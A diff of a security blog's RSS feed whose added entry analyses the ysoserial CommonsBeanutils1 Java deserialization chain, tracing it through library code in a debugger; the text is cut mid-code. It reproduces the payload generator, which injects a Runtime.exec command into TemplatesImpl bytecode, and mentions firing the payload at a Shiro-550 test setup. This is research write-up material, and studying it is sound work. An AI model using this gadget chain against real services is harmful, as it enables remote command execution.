@@ -1,8 +1,663 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>反序列化 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><description>Recent content in 反序列化 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 12 Jan 2024 17:03:07 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>CommonsBeanutils1 Chain</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</link><pubDate>Fri, 12 Jan 2024 14:32:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</guid><description>概述 在ysoserial中实现了CommonsBeanutils1反序列化链，可以利用这个链执行代码。
-细节 在ysoserial中实现CommonsBeanutils1代码如下，首先new BeanComparator/PriorityQueue对象，在PriorityQueue对象内添加两个int对象，而后通过反射修改property字段存储的值
-public class CommonsBeanutils1 implements ObjectPayload&amp;lt;Object&amp;gt; { public Object getObject(final String command) throws Exception { final Object templates = Gadgets.createTemplatesImpl(command); // mock method name until armed final BeanComparator comparator = new BeanComparator(&amp;#34;lowestSetBit&amp;#34;); // create queue with numbers and basic comparator final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2, comparator); // stub data for replacement later queue.add(new BigInteger(&amp;#34;1&amp;#34;)); queue.add(new BigInteger(&amp;#34;1&amp;#34;)); // switch method called by comparator Reflections.setFieldValue(comparator, &amp;#34;property&amp;#34;, &amp;#34;outputProperties&amp;#34;); // switch contents of queue final Object[] queueArray = (Object[]) Reflections.</description></item><item><title>JAVA URL DNS 研究</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</link><pubDate>Mon, 08 Jan 2024 16:57:37 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</guid><description>前言
-初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_whipper.0p@icloud.com
-URL类DNS请求 使用URL.equals会发起DNS请求
-public class urltest { public static void main(String[] args) throws MalformedURLException { System.out.println(&amp;#34;hello &amp;#34;); URL u = new URL(&amp;#34;http://www.baidu.com&amp;#34;); URL u1 = new URL(&amp;#34;http://www.baidu.com&amp;#34;); System.out.println(u.equals(u1)); } } 跟进代码，equals代码如下，
-protected boolean equals(URL u1, URL u2) { String ref1 = u1.getRef(); String ref2 = u2.getRef(); return (ref1 == ref2 || (ref1 != null &amp;amp;&amp;amp; ref1.equals(ref2))) &amp;amp;&amp;amp; sameFile(u1, u2); } 判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。
-protected boolean sameFile(URL u1, URL u2) { // Compare the protocols.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>反序列化 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><description>Recent content in 反序列化 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 12 Jan 2024 14:32:08 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>CommonsBeanutils1 Chain</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</link><pubDate>Fri, 12 Jan 2024 14:32:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</guid><description>&lt;h3 id="概述">概述&lt;/h3>
+&lt;p>在ysoserial中实现了&lt;code>CommonsBeanutils1&lt;/code>反序列化链，可以利用这个链执行代码。&lt;/p>
+&lt;h3 id="细节">细节&lt;/h3>
+&lt;p>在ysoserial中实现&lt;code>CommonsBeanutils1&lt;/code>代码如下，首先&lt;code>new BeanComparator/PriorityQueue&lt;/code>对象，在&lt;code>PriorityQueue&lt;/code>对象内添加两个int对象，而后通过反射修改property字段存储的值&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CommonsBeanutils1&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> ObjectPayload&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getObject&lt;/span>(&lt;span style="color:#66d9ef">final&lt;/span> String command) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> Object templates &lt;span style="color:#f92672">=&lt;/span> Gadgets.&lt;span style="color:#a6e22e">createTemplatesImpl&lt;/span>(command);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// mock method name until armed&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> BeanComparator comparator &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> BeanComparator(&lt;span style="color:#e6db74">&amp;#34;lowestSetBit&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// create queue with numbers and basic comparator&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> PriorityQueue&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> queue &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> PriorityQueue&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span>(2, comparator);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue.&lt;span style="color:#a6e22e">add&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> BigInteger(&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue.&lt;span style="color:#a6e22e">add&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> BigInteger(&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// switch method called by comparator&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Reflections.&lt;span style="color:#a6e22e">setFieldValue&lt;/span>(comparator, &lt;span style="color:#e6db74">&amp;#34;property&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;outputProperties&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// switch contents of queue&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> Object&lt;span style="color:#f92672">[]&lt;/span> queueArray &lt;span style="color:#f92672">=&lt;/span> (Object&lt;span style="color:#f92672">[]&lt;/span>) Reflections.&lt;span style="color:#a6e22e">getFieldValue&lt;/span>(queue, &lt;span style="color:#e6db74">&amp;#34;queue&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queueArray&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> templates;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queueArray&lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> templates;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> queue;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Object &lt;span style="color:#a6e22e">createTemplatesImpl&lt;/span>(String command) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Boolean.&lt;span style="color:#a6e22e">parseBoolean&lt;/span>(System.&lt;span style="color:#a6e22e">getProperty&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;properXalan&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;false&amp;#34;&lt;/span>)) &lt;span style="color:#f92672">?&lt;/span> createTemplatesImpl(command, Class.&lt;span style="color:#a6e22e">forName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;org.apache.xalan.xsltc.trax.TemplatesImpl&amp;#34;&lt;/span>), Class.&lt;span style="color:#a6e22e">forName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&amp;#34;&lt;/span>), Class.&lt;span style="color:#a6e22e">forName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&amp;#34;&lt;/span>)) : createTemplatesImpl(command, TemplatesImpl.&lt;span style="color:#a6e22e">class&lt;/span>, AbstractTranslet.&lt;span style="color:#a6e22e">class&lt;/span>, TransformerFactoryImpl.&lt;span style="color:#a6e22e">class&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> T &lt;span style="color:#a6e22e">createTemplatesImpl&lt;/span>(String command, Class&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> tplClass, Class&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> abstTranslet, Class&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> transFactory) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> T templates &lt;span style="color:#f92672">=&lt;/span> tplClass.&lt;span style="color:#a6e22e">newInstance&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ClassPool pool &lt;span style="color:#f92672">=&lt;/span> ClassPool.&lt;span style="color:#a6e22e">getDefault&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool.&lt;span style="color:#a6e22e">insertClassPath&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> ClassClassPath(StubTransletPayload.&lt;span style="color:#a6e22e">class&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool.&lt;span style="color:#a6e22e">insertClassPath&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> ClassClassPath(abstTranslet));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CtClass clazz &lt;span style="color:#f92672">=&lt;/span> pool.&lt;span style="color:#a6e22e">get&lt;/span>(StubTransletPayload.&lt;span style="color:#a6e22e">class&lt;/span>.&lt;span style="color:#a6e22e">getName&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String cmd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;java.lang.Runtime.getRuntime().exec(\&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> command.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;\\&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;\\\\&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;\\\&amp;#34;&amp;#34;&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;\&amp;#34;);&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clazz.&lt;span style="color:#a6e22e">makeClassInitializer&lt;/span>().&lt;span style="color:#a6e22e">insertAfter&lt;/span>(cmd);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clazz.&lt;span style="color:#a6e22e">setName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ysoserial.Pwner&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> System.&lt;span style="color:#a6e22e">nanoTime&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CtClass superC &lt;span style="color:#f92672">=&lt;/span> pool.&lt;span style="color:#a6e22e">get&lt;/span>(abstTranslet.&lt;span style="color:#a6e22e">getName&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clazz.&lt;span style="color:#a6e22e">setSuperclass&lt;/span>(superC);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> classBytes &lt;span style="color:#f92672">=&lt;/span> clazz.&lt;span style="color:#a6e22e">toBytecode&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Reflections.&lt;span style="color:#a6e22e">setFieldValue&lt;/span>(templates, &lt;span style="color:#e6db74">&amp;#34;_bytecodes&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span>{classBytes, ClassFiles.&lt;span style="color:#a6e22e">classAsBytes&lt;/span>(Foo.&lt;span style="color:#a6e22e">class&lt;/span>)});
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Reflections.&lt;span style="color:#a6e22e">setFieldValue&lt;/span>(templates, &lt;span style="color:#e6db74">&amp;#34;_name&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Pwnr&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Reflections.&lt;span style="color:#a6e22e">setFieldValue&lt;/span>(templates, &lt;span style="color:#e6db74">&amp;#34;_tfactory&amp;#34;&lt;/span>, transFactory.&lt;span style="color:#a6e22e">newInstance&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> templates;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而后通过反射将PriorityQueue对象存储的两个BigInteger对象改为创建的TemplatesImpl对象。
+&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/1.png" />&lt;/p>
+&lt;p>&lt;strong>根因分析&lt;/strong>
+根据前面调试知道，&lt;code>CommonsBeanutils1&lt;/code>序列化&lt;code>PriorityQueue&lt;/code>对象，其中&lt;code>comparator&lt;/code>指定为&lt;code>BeanComparator&lt;/code>，&lt;code>PriorityQueue&lt;/code>内存了两个&lt;code>TemplatesImpl&lt;/code>对象。&lt;/p>
+&lt;p>使用
+&lt;a href="https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/">shiro 550&lt;/a>环境，发送payload，在调试器中可以看到，首先反序列化&lt;code>PriorityQueue&lt;/code>对象
+&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/2.png" />&lt;/p>
+&lt;p>在readObject断点，可以看到尝试反序列化&lt;code>comparator&lt;/code>，这里是&lt;code>BeanComparator&lt;/code>，并递归反序列化&lt;code>TemplatesImpl&lt;/code>
+&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/3.png" />&lt;/p>
+&lt;p>而后readObject会调用heapify方法，跟进调用最后调用到comparator.compare&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">heapify&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> (size &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> 1) &lt;span style="color:#f92672">-&lt;/span> 1; i &lt;span style="color:#f92672">&amp;gt;=&lt;/span> 0; i&lt;span style="color:#f92672">--&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> siftDown(i, (E) queue&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">siftDown&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> k, E x) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (comparator &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> siftDownUsingComparator(k, x);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> siftDownComparable(k, x);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">siftDownUsingComparator&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> k, E x) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> half &lt;span style="color:#f92672">=&lt;/span> size &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> 1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (k &lt;span style="color:#f92672">&amp;lt;&lt;/span> half) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> child &lt;span style="color:#f92672">=&lt;/span> (k &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> 1) &lt;span style="color:#f92672">+&lt;/span> 1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object c &lt;span style="color:#f92672">=&lt;/span> queue&lt;span style="color:#f92672">[&lt;/span>child&lt;span style="color:#f92672">]&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> right &lt;span style="color:#f92672">=&lt;/span> child &lt;span style="color:#f92672">+&lt;/span> 1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (right &lt;span style="color:#f92672">&amp;lt;&lt;/span> size &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> comparator.&lt;span style="color:#a6e22e">compare&lt;/span>((E) c, (E) queue&lt;span style="color:#f92672">[&lt;/span>right&lt;span style="color:#f92672">]&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> 0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">=&lt;/span> queue&lt;span style="color:#f92672">[&lt;/span>child &lt;span style="color:#f92672">=&lt;/span> right&lt;span style="color:#f92672">]&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (comparator.&lt;span style="color:#a6e22e">compare&lt;/span>(x, (E) c) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> 0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">[&lt;/span>k&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> c;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> k &lt;span style="color:#f92672">=&lt;/span> child;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">[&lt;/span>k&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> x;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>BeanComparator实现了Comparator接口，compare方法代码如下，其会调用getProperty方法，前面在ysoserial中property被设置为outputProperities&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">compare&lt;/span>(T o1, T o2) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">property&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">internalCompare&lt;/span>(o1, o2);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object value1 &lt;span style="color:#f92672">=&lt;/span> PropertyUtils.&lt;span style="color:#a6e22e">getProperty&lt;/span>(o1, &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">property&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object value2 &lt;span style="color:#f92672">=&lt;/span> PropertyUtils.&lt;span style="color:#a6e22e">getProperty&lt;/span>(o2, &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">property&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">internalCompare&lt;/span>(value1, value2);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (IllegalAccessException var5) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RuntimeException(&lt;span style="color:#e6db74">&amp;#34;IllegalAccessException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> var5.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (InvocationTargetException var6) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RuntimeException(&lt;span style="color:#e6db74">&amp;#34;InvocationTargetException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> var6.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (NoSuchMethodException var7) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RuntimeException(&lt;span style="color:#e6db74">&amp;#34;NoSuchMethodException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> var7.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/4.png" />&lt;/p>
+&lt;p>跟进getProperty方法内，其中bean为&lt;code>TemplatesImpl&lt;/code>对象，会进入&lt;code>bean = this.getSimpleProperty(bean, name);&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Object &lt;span style="color:#a6e22e">getProperty&lt;/span>(Object bean, String name) &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> PropertyUtilsBean.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getProperty&lt;/span>(bean, name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getProperty&lt;/span>(Object bean, String name) &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getNestedProperty&lt;/span>(bean, name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getNestedProperty&lt;/span>(Object bean, String name) &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (bean &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
